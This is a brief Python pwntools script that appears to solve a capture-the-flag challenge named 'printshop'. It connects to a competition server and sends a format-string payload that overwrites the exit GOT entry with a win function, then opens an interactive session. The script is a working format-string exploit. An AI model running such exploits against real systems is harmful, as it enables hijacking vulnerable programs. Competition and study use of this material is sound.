from pwn import *

context.binary = exe = ELF('./printshop')

io = remote('chal.pctf.competitivecyber.club', 7997)

io.recvuntil(b'>> ')
payload = fmtstr_payload(6, {exe.got['exit']:exe.sym['win']})
io.sendline(payload)
io.interactive()